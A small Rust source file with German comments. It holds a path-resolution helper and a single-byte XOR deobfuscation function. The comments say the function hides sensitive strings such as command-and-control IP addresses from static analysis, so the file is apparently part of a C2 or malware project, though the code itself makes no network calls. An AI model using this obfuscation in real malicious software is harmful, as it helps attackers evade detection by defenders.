use std::env;
use std::path::{Path, PathBuf};

/// Löst einen Dateipfad deterministisch auf.
///
/// Args:
/// - input_path: relativer oder absoluter Pfad als String
///
/// Returns:
/// - PathBuf: absoluter Pfad (bei relativen Pfaden relativ zur Executable),
///            sonst unveränderter Eingabepfad
pub fn resolve_path(input_path: &str) -> PathBuf {
    let path = Path::new(input_path);
    if path.is_absolute() {
        return path.to_path_buf();
    }

    match env::current_exe() {
        Ok(exe_path) => {
            if let Some(parent) = exe_path.parent() {
                return parent.join(path);
            }
        }
        Err(_) => {
            return path.to_path_buf();
        }
    }

    // Fallback: Input zurückgeben
    PathBuf::from(input_path)
}

/// Entschlüsselt (de-obfuskiert) Daten, die mit einer einfachen XOR-Operation versteckt wurden.
///
/// Wird aktuell nicht im eigentlichen Code verwendet aufgrund von einfacherer Benutzung
/// (Nicht notwendig, die erstellte IP zunächst zu verschlüsseln)
///
/// Diese Funktion wird verwendet, um sensible Strings (wie C2-IP-Adressen oder Dateinamen)
/// zur Laufzeit wiederherzustellen, damit sie bei einer statischen Analyse (z.B. mit dem `strings` Befehl)
/// nicht im Klartext in der Binary sichtbar sind.
///
/// # Arguments
///
/// * `data` - Ein Byte-Slice (`&[u8]`), der die verschlüsselten Daten enthält.
/// * `key` - Der Ein-Byte-Schlüssel (`u8`), mit dem die Daten ursprünglich XOR-verknüpft wurden.
///
/// # Returns
///
/// Gibt den entschlüsselten String zurück.
/// Falls die entschlüsselten Bytes kein gültiges UTF-8 sind (z.B. bei falschem Key),
/// wird ein leerer String zurückgegeben (`unwrap_or_default`), um Abstürze zu vermeiden.
pub fn deobfuscate(data: &[u8], key: u8) -> String {
    let decrypted: Vec<u8> = data.iter().map(|&b| b ^ key).collect();
    String::from_utf8(decrypted).unwrap_or_default()
}
